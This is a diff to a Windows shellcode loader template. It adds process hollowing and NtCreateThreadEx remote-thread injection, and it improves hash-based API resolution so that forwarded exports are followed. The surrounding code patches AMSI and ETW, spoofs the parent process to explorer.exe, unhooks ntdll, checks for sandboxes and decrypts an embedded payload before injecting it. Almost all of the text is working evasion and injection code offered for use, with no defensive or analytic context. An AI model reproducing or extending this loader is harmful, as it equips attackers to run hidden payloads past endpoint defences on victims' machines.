@@ -4,6 +4,8 @@
 //   USE_XOR           : XOR decryption
 //   USE_PPID_SPOOF    : Spoof PPID to explorer.exe
 //   USE_THREAD_HIJACK : RIP redirect instead of Early Bird APC
+//   USE_HOLLOW        : Process Hollowing (unmap original + RIP redirect)
+//   USE_REMOTE_THREAD : NtCreateThreadEx in an existing process (no CreateProcess)
 //   USE_AMSI_PATCH    : Patch AmsiScanBuffer
 //   USE_SANDBOX_CHECK : Basic sandbox/timing detection
 //   USE_WIPE          : Zero heap payload after injection
@@ -94,8 +96,9 @@ static constexpr DWORD _hW(const wchar_t *s, DWORD h = 5381) {
     return *s ? _hW(s + 1, h * 33 ^ (DWORD)((*s >= L'A' && *s <= L'Z') ? *s + 32 : *s)) : h;
 }
 
-constexpr DWORD HMOD_KERNEL32 = _hW(L"kernel32.dll");
-constexpr DWORD HMOD_NTDLL    = _hW(L"ntdll.dll");
+constexpr DWORD HMOD_KERNEL32   = _hW(L"kernel32.dll");
+constexpr DWORD HMOD_KERNELBASE = _hW(L"kernelbase.dll");
+constexpr DWORD HMOD_NTDLL      = _hW(L"ntdll.dll");
 #ifdef USE_AMSI_PATCH
 constexpr DWORD HMOD_AMSI     = _hW(L"amsi.dll");
 #endif
@@ -108,18 +111,20 @@ constexpr DWORD HF_CloseHandle              = _hA("CloseHandle");
 constexpr DWORD HF_VirtualProtect           = _hA("VirtualProtect");
 constexpr DWORD HF_CreateProcessW           = _hA("CreateProcessW");
 constexpr DWORD HF_ResumeThread             = _hA("ResumeThread");
-constexpr DWORD HF_HeapAlloc                = _hA("HeapAlloc");
-constexpr DWORD HF_HeapFree                 = _hA("HeapFree");
-constexpr DWORD HF_GetProcessHeap           = _hA("GetProcessHeap");
 constexpr DWORD HF_LoadLibraryA             = _hA("LoadLibraryA");
-#ifdef USE_PPID_SPOOF
+#if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD)
 constexpr DWORD HF_CreateToolhelp32Snapshot = _hA("CreateToolhelp32Snapshot");
 constexpr DWORD HF_Process32FirstW          = _hA("Process32FirstW");
 constexpr DWORD HF_Process32NextW           = _hA("Process32NextW");
 constexpr DWORD HF_OpenProcess              = _hA("OpenProcess");
+#endif
+#ifdef USE_PPID_SPOOF
 constexpr DWORD HF_InitProcThreadAttrList   = _hA("InitializeProcThreadAttributeList");
 constexpr DWORD HF_UpdateProcThreadAttr     = _hA("UpdateProcThreadAttribute");
 constexpr DWORD HF_DeleteProcThreadAttrList = _hA("DeleteProcThreadAttributeList");
+#endif
+#ifdef USE_REMOTE_THREAD
+constexpr DWORD HF_NtCreateThreadEx         = _hA("NtCreateThreadEx");
 #endif
 #ifdef USE_SANDBOX_CHECK
 constexpr DWORD HF_GetTickCount64           = _hA("GetTickCount64");
@@ -129,14 +134,20 @@ constexpr DWORD HF_GetSystemInfo            = _hA("GetSystemInfo");
 #endif
 
 constexpr DWORD HF_NtAllocateVirtualMemory  = _hA("NtAllocateVirtualMemory");
+constexpr DWORD HF_NtFreeVirtualMemory      = _hA("NtFreeVirtualMemory");
 constexpr DWORD HF_NtWriteVirtualMemory     = _hA("NtWriteVirtualMemory");
 constexpr DWORD HF_NtProtectVirtualMemory   = _hA("NtProtectVirtualMemory");
 constexpr DWORD HF_NtQueueApcThread         = _hA("NtQueueApcThread");
 constexpr DWORD HF_NtResumeThread           = _hA("NtResumeThread");
 constexpr DWORD HF_EtwEventWrite            = _hA("EtwEventWrite");
-#ifdef USE_THREAD_HIJACK
+#if defined(USE_THREAD_HIJACK) || defined(USE_HOLLOW)
 constexpr DWORD HF_NtGetContextThread       = _hA("NtGetContextThread");
 constexpr DWORD HF_NtSetContextThread       = _hA("NtSetContextThread");
+#endif
+#ifdef USE_HOLLOW
+constexpr DWORD HF_NtQueryInformationProcess = _hA("NtQueryInformationProcess");
+constexpr DWORD HF_NtReadVirtualMemory       = _hA("NtReadVirtualMemory");
+constexpr DWORD HF_NtUnmapViewOfSection      = _hA("NtUnmapViewOfSection");
 #endif
 #ifdef USE_AMSI_PATCH
 constexpr DWORD HF_AmsiScanBuffer           = _hA("AmsiScanBuffer");
@@ -175,14 +186,31 @@ static HMODULE peb_module(DWORD hash) {
     return NULL;
 }
 
-// ─── Export table walk: resolve function by hash ────────────────────────────
+// ─── Export table walk: resolve function by hash (handles forwarded exports) ─
 
-static FARPROC resolve(HMODULE hMod, DWORD hash) {
-    if (!hMod) return NULL;
+static DWORD _hash_name_ascii(const char *s) {
+    DWORD h = 5381;
+    while (*s) h = h * 33 ^ (DWORD)(unsigned char)*s++;
+    return h;
+}
+static DWORD _hash_dll_name(const char *s) {
+    /* Same as _hW but from ASCII, lowercase A-Z -> a-z */
+    DWORD h = 5381;
+    for (; *s; s++) {
+        unsigned char c = (unsigned char)*s;
+        if (c >= 'A' && c <= 'Z') c += 32;
+        h = h * 33 ^ (DWORD)c;
+    }
+    return h;
+}
+
+static FARPROC resolve(HMODULE hMod, DWORD hash, int depth = 0) {
+    if (!hMod || depth > 4) return NULL;
     BYTE *base = (BYTE *)hMod;
     IMAGE_DOS_HEADER *dos  = (IMAGE_DOS_HEADER *)base;
     IMAGE_NT_HEADERS *nt   = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
-    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD exp_rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
+    DWORD exp_size = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
     if (!exp_rva) return NULL;
     IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);
     DWORD *names    = (DWORD *)(base + exp->AddressOfNames);
@@ -191,13 +219,36 @@ static FARPROC resolve(HMODULE hMod, DWORD hash) {
     for (DWORD i = 0; i < exp->NumberOfNames; i++) {
         const char *name = (const char *)(base + names[i]);
         DWORD h = 5381;
-        while (*name) h = h * 33 ^ (DWORD)(unsigned char)*name++;
-        if (h == hash) return (FARPROC)(base + funcs[ordinals[i]]);
+        const char *p = name;
+        while (*p) h = h * 33 ^ (DWORD)(unsigned char)*p++;
+        if (h != hash) continue;
+        DWORD fn_rva = funcs[ordinals[i]];
+        /* Forwarded export: RVA falls inside the export directory region */
+        if (fn_rva >= exp_rva && fn_rva < exp_rva + exp_size) {
+            /* String format: "DLLNAME.FuncName" (DLLNAME has no .dll suffix) */
+            const char *fwd = (const char *)(base + fn_rva);
+            char dll_buf[72]; int di = 0;
+            p = fwd;
+            while (*p && *p != '.' && di < 63) dll_buf[di++] = *p++;
+            dll_buf[di++]='.'; dll_buf[di++]='d'; dll_buf[di++]='l'; dll_buf[di++]='l'; dll_buf[di]='\0';
+            if (*p == '.') p++;
+            DWORD fn_hash  = _hash_name_ascii(p);
+            DWORD dll_hash = _hash_dll_name(dll_buf);
+            HMODULE hFwd   = peb_module(dll_hash);
+            if (hFwd) return resolve(hFwd, fn_hash, depth + 1);
+            return NULL;
+        }
+        return (FARPROC)(base + fn_rva);
     }
     return NULL;
 }
 
-#define R(mod, fn) resolve(peb_module(mod), fn)
+#define R(mod, fn)   resolve(peb_module(mod), fn)
+/* Try kernel32 first, fall back to KernelBase (API-set forwarding) */
+#define RK32(fn)     ([&]() -> FARPROC { \
+    FARPROC _p = resolve(peb_module(HMOD_KERNEL32),   fn); \
+    if (!_p)  _p = resolve(peb_module(HMOD_KERNELBASE), fn); \
+    return _p; }())
 
 // ─── ntdll unhook: remap .text from clean disk copy ─────────────────────────
 
@@ -335,11 +386,11 @@ static int sandbox_check() {
 }
 #endif /* USE_SANDBOX_CHECK */
 
-// ─── PPID spoof: find explorer.exe PID ───────────────────────────────────────
+// ─── Process lookup by name (PPID spoof + remote thread) ────────────────────
 
-#ifdef USE_PPID_SPOOF
+#if defined(USE_PPID_SPOOF) || defined(USE_REMOTE_THREAD)
 #include <tlhelp32.h>
-static DWORD get_explorer_pid() {
+static DWORD find_process_pid(const wchar_t *name) {
     typedef HANDLE (WINAPI *t_CTS)(DWORD, DWORD);
     typedef BOOL   (WINAPI *t_P32FW)(HANDLE, LPPROCESSENTRY32W);
     typedef BOOL   (WINAPI *t_P32NW)(HANDLE, LPPROCESSENTRY32W);
@@ -356,12 +407,12 @@ static DWORD get_explorer_pid() {
     PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
     DWORD pid = 0;
     if (pPFF(snap, &pe)) do {
-        if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) { pid = pe.th32ProcessID; break; }
+        if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
     } while (pPFN(snap, &pe));
     pCH(snap);
     return pid;
 }
-#endif /* USE_PPID_SPOOF */
+#endif /* USE_PPID_SPOOF || USE_REMOTE_THREAD */
 
 // ─── WinMain ─────────────────────────────────────────────────────────────────
 
@@ -399,8 +450,6 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     }
 #endif /* USE_ETW_PATCH */
 
-    DBG("[3b] Past ETW block");
-
     /* AMSI patch: xor eax,eax; ret */
 #ifdef USE_AMSI_PATCH
     {
@@ -430,34 +479,35 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     }
 #endif /* USE_AMSI_PATCH */
 
-    DBG("[3c] Past AMSI block - resolving heap APIs");
+    /* Resolve all Nt* from ntdll (no forwarded exports, actual syscall stubs) */
+    typedef NTSTATUS (NTAPI *t_NtAVM)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
+    typedef NTSTATUS (NTAPI *t_NtFVM)(HANDLE,PVOID*,PSIZE_T,ULONG);
+    typedef NTSTATUS (NTAPI *t_NtWVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
+    typedef NTSTATUS (NTAPI *t_NtPVM)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
+    typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
+    typedef NTSTATUS (NTAPI *t_NtRT) (HANDLE,PULONG);
 
-    /* Copy payload to heap + wipe static .data */
-    typedef HANDLE (WINAPI *t_GPH)();
-    typedef LPVOID (WINAPI *t_HA)(HANDLE, DWORD, SIZE_T);
-    typedef BOOL   (WINAPI *t_HF)(HANDLE, DWORD, LPVOID);
+    HMODULE hNtdll = peb_module(HMOD_NTDLL);
+    t_NtAVM pNtAVM = (t_NtAVM)resolve(hNtdll, HF_NtAllocateVirtualMemory);
+    t_NtFVM pNtFVM = (t_NtFVM)resolve(hNtdll, HF_NtFreeVirtualMemory);
+    t_NtWVM pNtWVM = (t_NtWVM)resolve(hNtdll, HF_NtWriteVirtualMemory);
+    t_NtPVM pNtPVM = (t_NtPVM)resolve(hNtdll, HF_NtProtectVirtualMemory);
+    t_NtRT  pNtRT  = (t_NtRT) resolve(hNtdll, HF_NtResumeThread);
 
-    HMODULE _hK32 = peb_module(HMOD_KERNEL32);
-    DBG_HEX("[3d] kernel32 HMODULE", (unsigned long long)(ULONG_PTR)_hK32);
-    DBG("[3e] about to call resolve(GetProcessHeap)");
+    if (!pNtAVM || !pNtFVM || !pNtWVM || !pNtPVM || !pNtRT) {
+        DBG("[FAIL] Nt* API resolution failed"); return 1;
+    }
 
-    t_GPH pGPH = (t_GPH)resolve(_hK32, HF_GetProcessHeap);
-    DBG_HEX("[3f] pGPH", (unsigned long long)(ULONG_PTR)pGPH);
+    /* Allocate local RW page for decrypted shellcode (NtAllocateVirtualMemory on self) */
+    unsigned char *sc = NULL;
+    SIZE_T sc_sz = payload_size;
+    NTSTATUS stLocal = pNtAVM((HANDLE)-1, (PVOID*)&sc, 0, &sc_sz,
+                               MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!sc) { DBG("[FAIL] local alloc failed"); return 1; }
 
-    t_HA  pHA  = (t_HA) resolve(_hK32, HF_HeapAlloc);
-    DBG_HEX("[3g] pHA", (unsigned long long)(ULONG_PTR)pHA);
-
-    t_HF  pHF  = (t_HF) resolve(_hK32, HF_HeapFree);
-    DBG_HEX("[3h] pHF", (unsigned long long)(ULONG_PTR)pHF);
-
-    if (!pGPH || !pHA || !pHF) { DBG("[FAIL] Heap API resolution failed"); return 1; }
-
-    HANDLE heap = pGPH();
-    unsigned char *sc = (unsigned char *)pHA(heap, 0, payload_size);
-    if (!sc) { DBG("[FAIL] HeapAlloc failed"); return 1; }
     memcpy(sc, payload, payload_size);
     memset(payload, 0, payload_size);
-    DBG_VAL("[5] Payload copied to heap, size", (unsigned long long)payload_size);
+    DBG_VAL("[5] Payload copied, size", (unsigned long long)payload_size);
 
     /* Decrypt */
 #ifdef USE_RC4
@@ -470,6 +520,62 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     DBG("[6] No decryption (plaintext)");
 #endif
 
+#ifdef USE_REMOTE_THREAD
+    /* Inject into existing process via NtCreateThreadEx */
+    {
+        typedef NTSTATUS (NTAPI *t_NtCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
+        typedef HANDLE (WINAPI *t_OP)(DWORD,BOOL,DWORD);
+        typedef BOOL   (WINAPI *t_CH)(HANDLE);
+        t_NtCTE pNtCTE = (t_NtCTE)resolve(hNtdll, HF_NtCreateThreadEx);
+        t_OP    pOP    = (t_OP)  R(HMOD_KERNEL32, HF_OpenProcess);
+        t_CH    pCH    = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
+        if (!pNtCTE || !pOP) {
+            DBG("[FAIL] RemoteThread: API resolution failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        wchar_t target[] = { %TARGET_PROCESS_W% };
+        DWORD tpid = find_process_pid(target);
+        DBG_VAL("[RT1] target PID", (unsigned long long)tpid);
+        if (!tpid) {
+            DBG("[FAIL] RemoteThread: target process not found");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        HANDLE hProc = pOP(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, tpid);
+        if (!hProc) {
+            DBG("[FAIL] RemoteThread: OpenProcess failed");
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        DBG("[RT2] OpenProcess OK");
+        PVOID  remote   = NULL;
+        SIZE_T alloc_sz = payload_size;
+        NTSTATUS st = pNtAVM(hProc, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        if (!remote) {
+            DBG_HEX("[FAIL] RemoteThread: NtAVM status", (unsigned long long)(ULONG)st);
+            pCH(hProc);
+            { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+            return 1;
+        }
+        DBG_HEX("[RT3] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);
+        pNtWVM(hProc, remote, sc, payload_size, NULL);
+#ifdef USE_WIPE
+        memset(sc, 0, payload_size);
+#endif
+        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+        PVOID  prot_base = remote;
+        SIZE_T prot_sz   = payload_size;
+        ULONG  old_prot  = 0;
+        pNtPVM(hProc, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
+        DBG("[RT4] RW -> RX");
+        HANDLE hThread = NULL;
+        st = pNtCTE(&hThread, THREAD_ALL_ACCESS, NULL, hProc, remote, NULL, 0, 0, 0, 0, NULL);
+        DBG_HEX("[RT5] NtCreateThreadEx status", (unsigned long long)(ULONG)st);
+        if (hThread) pCH(hThread);
+        pCH(hProc);
+    }
+#else
     /* Spawn target process suspended */
     PROCESS_INFORMATION pi = {0};
     wchar_t target[] = { %TARGET_PROCESS_W% };
@@ -485,21 +591,29 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
     typedef BOOL   (WINAPI *t_CH)(HANDLE);
     typedef BOOL   (WINAPI *t_CPW)(LPCWSTR,LPWSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCWSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
 
-    t_IPAL pIPAL = (t_IPAL)R(HMOD_KERNEL32, HF_InitProcThreadAttrList);
-    t_UPTA pUPTA = (t_UPTA)R(HMOD_KERNEL32, HF_UpdateProcThreadAttr);
-    t_DPAL pDPAL = (t_DPAL)R(HMOD_KERNEL32, HF_DeleteProcThreadAttrList);
+    t_IPAL pIPAL = (t_IPAL)RK32(HF_InitProcThreadAttrList);
+    t_UPTA pUPTA = (t_UPTA)RK32(HF_UpdateProcThreadAttr);
+    t_DPAL pDPAL = (t_DPAL)RK32(HF_DeleteProcThreadAttrList);
     t_OP   pOP   = (t_OP)  R(HMOD_KERNEL32, HF_OpenProcess);
     t_CH   pCH   = (t_CH)  R(HMOD_KERNEL32, HF_CloseHandle);
     t_CPW  pCPW  = (t_CPW) R(HMOD_KERNEL32, HF_CreateProcessW);
 
+    /* Stack-allocated PAL - avoids Heap* forwarded exports */
+    char pal_buf[1024] = {0};
+    LPPROC_THREAD_ATTRIBUTE_LIST pal = NULL;
     SIZE_T pal_sz = 0;
-    if (pIPAL) pIPAL(NULL, 1, 0, &pal_sz);
-    LPPROC_THREAD_ATTRIBUTE_LIST pal = pal_sz
-        ? (LPPROC_THREAD_ATTRIBUTE_LIST)pHA(heap, 0, pal_sz) : NULL;
+    if (pIPAL) {
+        pIPAL(NULL, 1, 0, &pal_sz);
+        DBG_VAL("[7a] PAL size needed", (unsigned long long)pal_sz);
+        if (pal_sz && pal_sz <= sizeof(pal_buf)) {
+            pal = (LPPROC_THREAD_ATTRIBUTE_LIST)pal_buf;
+            if (!pIPAL(pal, 1, 0, &pal_sz)) { DBG("[WARN] IPAL second call failed"); pal = NULL; }
+        } else { DBG_VAL("[WARN] PAL buf too small or pal_sz=0", (unsigned long long)pal_sz); }
+    } else { DBG("[WARN] pIPAL is NULL"); }
     HANDLE hParent = NULL;
 
-    if (pal && pIPAL && pIPAL(pal, 1, 0, &pal_sz)) {
-        DWORD epid = get_explorer_pid();
+    if (pal) {
+        DWORD epid = find_process_pid(L"explorer.exe");
         DBG_VAL("[7] Explorer PID", epid);
         if (epid && pOP) hParent = pOP(PROCESS_CREATE_PROCESS, FALSE, epid);
         if (hParent) {
@@ -510,13 +624,12 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
         siex.lpAttributeList = pal;
     } else { DBG("[WARN] InitializeProcThreadAttributeList failed"); }
 
-    BOOL cpw_ok = FALSE;
-    if (pCPW) cpw_ok = pCPW(target, NULL, NULL, NULL, FALSE,
+    if (pCPW) pCPW(target, NULL, NULL, NULL, FALSE,
         CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
         NULL, NULL, (LPSTARTUPINFOW)&siex, &pi);
-    DBG_VAL("[8] CreateProcess (PPID spoof) result pid", pi.dwProcessId);
+    DBG_VAL("[8] CreateProcess (PPID spoof) pid", pi.dwProcessId);
 
-    if (pal)    { if (pDPAL) pDPAL(pal); pHF(heap, 0, pal); }
+    if (pal && pDPAL) pDPAL(pal);
     if (hParent && pCH) pCH(hParent);
 #else
     {
@@ -531,105 +644,138 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
 
     if (!pi.hProcess) {
         DBG("[FAIL] CreateProcess failed (hProcess=NULL)");
-        pHF(heap, 0, sc);
+        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
         return 1;
     }
     DBG("[8] Target process created suspended");
 
-    /* Resolve Nt* from (now clean) ntdll */
-    typedef NTSTATUS (NTAPI *t_NtAVM)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
-    typedef NTSTATUS (NTAPI *t_NtWVM)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
-    typedef NTSTATUS (NTAPI *t_NtPVM)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
-    typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
-    typedef NTSTATUS (NTAPI *t_NtRT)(HANDLE,PULONG);
-
-    t_NtAVM pNtAVM = (t_NtAVM)R(HMOD_NTDLL, HF_NtAllocateVirtualMemory);
-    t_NtWVM pNtWVM = (t_NtWVM)R(HMOD_NTDLL, HF_NtWriteVirtualMemory);
-    t_NtPVM pNtPVM = (t_NtPVM)R(HMOD_NTDLL, HF_NtProtectVirtualMemory);
-    t_NtRT  pNtRT  = (t_NtRT) R(HMOD_NTDLL, HF_NtResumeThread);
-
-    if (!pNtAVM || !pNtWVM || !pNtPVM || !pNtRT) {
-        DBG("[FAIL] Nt* API resolution failed");
-        pHF(heap, 0, sc);
-        typedef BOOL (WINAPI *t_CH)(HANDLE);
-        t_CH pCH2 = (t_CH)R(HMOD_KERNEL32, HF_CloseHandle);
+    if (!pNtWVM || !pNtPVM || !pNtRT) {
+        DBG("[FAIL] Nt write/protect/resume APIs missing");
+        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+        typedef BOOL (WINAPI *t_CH2)(HANDLE);
+        t_CH2 pCH2 = (t_CH2)R(HMOD_KERNEL32, HF_CloseHandle);
         if (pCH2) { pCH2(pi.hThread); pCH2(pi.hProcess); }
         return 1;
     }
-    DBG("[9] Nt* APIs resolved");
 
-    /* Alloc RW in target */
+    /* Alloc RW in target process */
     PVOID  remote = NULL;
     SIZE_T alloc_sz = payload_size;
     NTSTATUS st = pNtAVM(pi.hProcess, &remote, 0, &alloc_sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!remote) {
-        DBG_HEX("[FAIL] NtAllocateVirtualMemory failed, NTSTATUS", (unsigned long long)(ULONG)st);
-        pHF(heap, 0, sc);
-        typedef BOOL (WINAPI *t_CH)(HANDLE);
-        t_CH pCH2 = (t_CH)R(HMOD_KERNEL32, HF_CloseHandle);
+        DBG_HEX("[FAIL] NtAllocateVirtualMemory (remote) NTSTATUS", (unsigned long long)(ULONG)st);
+        { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
+        typedef BOOL (WINAPI *t_CH2)(HANDLE);
+        t_CH2 pCH2 = (t_CH2)R(HMOD_KERNEL32, HF_CloseHandle);
         if (pCH2) { pCH2(pi.hThread); pCH2(pi.hProcess); }
         return 1;
     }
-    DBG_HEX("[10] NtAllocateVirtualMemory OK, remote addr", (unsigned long long)(ULONG_PTR)remote);
+    DBG_HEX("[10] remote alloc addr", (unsigned long long)(ULONG_PTR)remote);
 
     /* Write shellcode */
     st = pNtWVM(pi.hProcess, remote, sc, payload_size, NULL);
-    DBG_HEX("[11] NtWriteVirtualMemory NTSTATUS", (unsigned long long)(ULONG)st);
 
 #ifdef USE_WIPE
     memset(sc, 0, payload_size);
 #endif
-    pHF(heap, 0, sc);
+    { SIZE_T fz = sc_sz; pNtFVM((HANDLE)-1, (PVOID*)&sc, &fz, MEM_RELEASE); }
 
     /* RW -> RX */
     PVOID  prot_base = remote;
     SIZE_T prot_sz   = payload_size;
     ULONG  old_prot  = 0;
     st = pNtPVM(pi.hProcess, &prot_base, &prot_sz, PAGE_EXECUTE_READ, &old_prot);
-    DBG_HEX("[12] NtProtectVirtualMemory (RX) NTSTATUS", (unsigned long long)(ULONG)st);
 
-#ifdef USE_THREAD_HIJACK
-    /* RIP redirect: redirect main thread to shellcode */
+#if defined(USE_HOLLOW)
+    {
+        typedef NTSTATUS (NTAPI *t_NQIP)(HANDLE, DWORD, PVOID, ULONG, PULONG);
+        typedef NTSTATUS (NTAPI *t_NtRVM)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+        typedef NTSTATUS (NTAPI *t_NtUVS)(HANDLE, PVOID);
+        typedef NTSTATUS (NTAPI *t_NtGCT)(HANDLE, PCONTEXT);
+        typedef NTSTATUS (NTAPI *t_NtSCT)(HANDLE, PCONTEXT);
+
+        t_NQIP  pNQIP  = (t_NQIP) resolve(hNtdll, HF_NtQueryInformationProcess);
+        t_NtRVM pNtRVM = (t_NtRVM)resolve(hNtdll, HF_NtReadVirtualMemory);
+        t_NtUVS pNtUVS = (t_NtUVS)resolve(hNtdll, HF_NtUnmapViewOfSection);
+        t_NtGCT pGCT   = (t_NtGCT)resolve(hNtdll, HF_NtGetContextThread);
+        t_NtSCT pSCT   = (t_NtSCT)resolve(hNtdll, HF_NtSetContextThread);
+
+        if (!pNQIP || !pNtRVM || !pNtUVS || !pGCT || !pSCT) {
+            DBG("[FAIL] Hollow: API resolution failed");
+        } else {
+            /* Get PEB base via NtQueryInformationProcess(ProcessBasicInformation=0) */
+            PROCESS_BASIC_INFORMATION pbi = {0};
+            pNQIP(pi.hProcess, 0, &pbi, sizeof(pbi), NULL);
+
+            /* Read PEB.ImageBaseAddress: offset 0x10 (x64) or 0x08 (x86) */
+            PVOID imageBase = NULL;
+#ifdef _WIN64
+            pNtRVM(pi.hProcess, (BYTE *)pbi.PebBaseAddress + 0x10,
+                   &imageBase, sizeof(PVOID), NULL);
+#else
+            pNtRVM(pi.hProcess, (BYTE *)pbi.PebBaseAddress + 0x08,
+                   &imageBase, sizeof(PVOID), NULL);
+#endif
+            DBG_HEX("[H1] PEB.ImageBase", (unsigned long long)(ULONG_PTR)imageBase);
+
+            if (imageBase) {
+                NTSTATUS stU = pNtUVS(pi.hProcess, imageBase);
+                DBG_HEX("[H2] NtUnmapViewOfSection status", (unsigned long long)(ULONG)stU);
+            } else {
+                DBG("[WARN] Hollow: imageBase NULL, unmap skipped");
+            }
+
+            CONTEXT ctx = {0};
+            ctx.ContextFlags = CONTEXT_FULL;
+            pGCT(pi.hThread, &ctx);
+#ifdef _WIN64
+            ctx.Rip = (DWORD64)remote;
+            DBG_HEX("[H3] Hollow RIP", (unsigned long long)ctx.Rip);
+#else
+            ctx.Eip = (DWORD)(ULONG_PTR)remote;
+            DBG_HEX("[H3] Hollow EIP", (unsigned long long)ctx.Eip);
+#endif
+            pSCT(pi.hThread, &ctx);
+        }
+    }
+#elif defined(USE_THREAD_HIJACK)
     {
         typedef NTSTATUS (NTAPI *t_NtGCT)(HANDLE, PCONTEXT);
         typedef NTSTATUS (NTAPI *t_NtSCT)(HANDLE, PCONTEXT);
-        t_NtGCT pGCT = (t_NtGCT)R(HMOD_NTDLL, HF_NtGetContextThread);
-        t_NtSCT pSCT = (t_NtSCT)R(HMOD_NTDLL, HF_NtSetContextThread);
+        t_NtGCT pGCT = (t_NtGCT)resolve(hNtdll, HF_NtGetContextThread);
+        t_NtSCT pSCT = (t_NtSCT)resolve(hNtdll, HF_NtSetContextThread);
         if (pGCT && pSCT) {
             CONTEXT ctx = {0};
             ctx.ContextFlags = CONTEXT_FULL;
             pGCT(pi.hThread, &ctx);
 #ifdef _WIN64
             ctx.Rip = (DWORD64)remote;
-            DBG_HEX("[13] Thread hijack: RIP set to", (unsigned long long)ctx.Rip);
+            DBG_HEX("[13] Thread hijack RIP", (unsigned long long)ctx.Rip);
 #else
             ctx.Eip = (DWORD)remote;
-            DBG_HEX("[13] Thread hijack: EIP set to", (unsigned long long)ctx.Eip);
+            DBG_HEX("[13] Thread hijack EIP", (unsigned long long)ctx.Eip);
 #endif
-            NTSTATUS st2 = pSCT(pi.hThread, &ctx);
-            DBG_HEX("[13] NtSetContextThread NTSTATUS", (unsigned long long)(ULONG)st2);
+            pSCT(pi.hThread, &ctx);
         } else { DBG("[FAIL] NtGet/SetContextThread not found"); }
     }
 #else
-    /* Early Bird APC */
     {
-        t_NtQAT pNtQAT = (t_NtQAT)R(HMOD_NTDLL, HF_NtQueueApcThread);
+        typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
+        t_NtQAT pNtQAT = (t_NtQAT)resolve(hNtdll, HF_NtQueueApcThread);
         if (pNtQAT) {
-            NTSTATUS st2 = pNtQAT(pi.hThread, (PVOID)remote, NULL, NULL, NULL);
-            DBG_HEX("[13] NtQueueApcThread NTSTATUS", (unsigned long long)(ULONG)st2);
+            pNtQAT(pi.hThread, (PVOID)remote, NULL, NULL, NULL);
         } else { DBG("[FAIL] NtQueueApcThread not found"); }
     }
-#endif /* USE_THREAD_HIJACK */
+#endif /* injection technique */
 
-    {
-        NTSTATUS st2 = pNtRT(pi.hThread, NULL);
-        DBG_HEX("[14] NtResumeThread NTSTATUS", (unsigned long long)(ULONG)st2);
-    }
+    pNtRT(pi.hThread, NULL);
     DBG("[15] Injection complete - thread resumed");
 
     typedef BOOL (WINAPI *t_CH)(HANDLE);
     t_CH pCH3 = (t_CH)R(HMOD_KERNEL32, HF_CloseHandle);
     if (pCH3) { pCH3(pi.hThread); pCH3(pi.hProcess); }
+
+#endif /* USE_REMOTE_THREAD */
 
     return 0;
 }
